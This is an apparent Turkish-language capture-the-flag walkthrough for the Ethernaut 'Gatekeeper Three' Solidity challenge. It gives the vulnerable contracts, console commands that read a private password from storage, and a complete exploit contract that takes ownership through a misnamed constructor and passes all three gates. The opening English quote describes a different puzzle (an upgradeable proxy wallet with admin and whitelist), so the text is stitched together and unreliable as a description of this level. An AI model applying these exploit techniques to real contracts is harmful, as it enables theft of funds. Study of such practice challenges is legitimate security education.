
# ETHERNAUT SORU 28: GATEKEEPER THREE

>Nowadays, paying for DeFi operations is impossible, fact.
>
>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.
>
>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
>
>Little did they know, their lunch money was at risk…
>
>You'll need to hijack this wallet to become the admin of the proxy.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

Bu soruda geçmeniz gereken üç farklı kapı vardır.
1. Kapıyı geçmek için:
	* Kontraktın sahibi (owner) olmalısınız.
	* Transaction owner tarafından başlatılmamalı.
2. Kapıyı geçmek için:
	* SimpleTrick adı verilen kontrakt için doğru şifreyi bulmalısınız.
3. Kapıyı geçmek için:
	* Kapı (gate) kontraktında 0.001'den fazla ether bulunmalı.
	* Çağıran adres gönderilen etherleri kabul etmemeli.

Bu  soruyu çözmek için önce gate kontraktındaki `createTrick` fonksiyonunu çağırmamız gereklidir:
```javascript
> await contract.createTrick()

> let trick_addr = await contract.trick()
// '0xD4Fb426cB28AE9B79322e1AC72Ee1f969C2CCBbf'
```
Sonrasında bulduğumuz trick kontraktının depolamasındaki (storage) 2. indise bakarak `password` değişkeninin değerini elde edebiliriz:
```javascript
> await web3.eth.getStorageAt(trick_addr, 2)
// 0x00000000000000000000000000000000000000000000000000000000664dd9e4'
```
Sorunun geri kalanını çözmek için bu üç kapıyı çözen bir `Solution` kontraktı yazacağız.
### 1. Kapı
 Bu kapıyı geçmek için Gatekeeper kontraktının sahibi olmalıyız (`owner` değişkeni yazacağımız çözüm kontraktının adresi olmalı). Bunun için kontraktta bulunan hatalı yazılmış `construct0r` fonksiyonunu çağırmamız yeterlidir. Bu kapı aynı zamanda transaction'ın owner tarafından başlatılmadığını kontrol etmektedir. Ancak transaction'u biz (EOA) başlatacağımız için ve owner yazacağımız çözüm kontraktı olacağından bu kontrol bizim için sorun teşkil etmemektedir.
### 2. Kapı
İkinci kapıyı geçmek için JavaScript konsolu yardımıyla aldığımız şifreyi göndermek yeterlidir.
### 3. Kapı
Bu kapıyı geçmek için Gatekeeper kontraktında 0.001 ether'den fazla bulunmalı. Bunun için yazacağımız çözüm kontraktının `constructor` fonksiyonunu `payable` yapıp EOA'dan gönderdiğimiz 0.002 ether'i doğrudan Gatekeeper'a iletmemiz yeterlidir. Bu kapının başka bir koşulu yazacağımız çözüm kontraktının gönderilecek herhangi ether'i kabul etmemesidir (kontraktınıza gelen ether'i kabul etmezseniz `send` fonksiyonu `false` döndürür). Bunun için ise çözüm kontraktımıza `receive` fonksiyonunu eklemeyeceğiz ve `constructor` dışında hiçbir fonksiyonu `payable` yapmayacağız.

Aşağıda yer alan Solidity kodundaki `Solution` kontraktı yukarıda bahsettiğimiz şekilde bu üç kapıyı çözmektedir.

```solidity
contract Solution {
	SimpleTrick trick;
	GatekeeperThree gate;

	constructor(address trick_addr,  address  payable gate_addr)  payable  {
		trick = SimpleTrick(trick_addr);
		gate = GatekeeperThree(gate_addr);
		gate_addr.transfer(msg.value);
	}

	function solve()  public  {
		require(trick.checkPassword(0x664dd9e4), "Password failed.");  // check password
		gate.getAllowance(0x664dd9e4);  // submit password
		gate.construct0r(); // gain ownership
		require(gate.owner()  ==  address(this), "Failed ownership.");
		gate.enter();
	}
}
```
